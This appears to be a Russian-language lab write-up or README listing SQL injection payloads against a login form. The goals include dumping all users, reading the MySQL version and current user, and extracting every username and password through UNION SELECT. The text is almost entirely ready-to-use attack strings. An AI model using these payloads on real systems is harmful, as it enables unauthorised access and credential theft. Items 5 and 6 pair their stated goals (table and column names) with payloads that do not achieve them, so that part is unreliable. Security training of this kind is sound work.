1. Список всех пользователей.
Инъекция: ' OR 1=1 #
![image](https://github.com/user-attachments/assets/be500567-e423-4c57-a012-9e362812fae5)
2. Узнать версию MySQL
Инъекция: ' UNION SELECT @@version, @@version-- (ввод в поле пароля)
![image](https://github.com/user-attachments/assets/bc405aac-a85a-4cd3-8778-c3b4afcace6e)
3. Узнать пароли всех пользователей
Инъекция: ' UNION SELECT username,password FROM users;
![image](https://github.com/user-attachments/assets/523a0a88-3c0a-4652-b164-69b7ee49dc81)

4. Определить текущего пользователя базы данных
Инъекция: ' UNION SELECT CURRENT_USER(), CURRENT_USER()-- (ввод в поле пароля)

5. Извлечь имена таблиц из схемы базы данных
Инъекция: ' OR 1=1 #

6. Получить список столбцов users таблицы
Инъекция: ' OR 1=1 #
' UNION SELECT password FROM users--
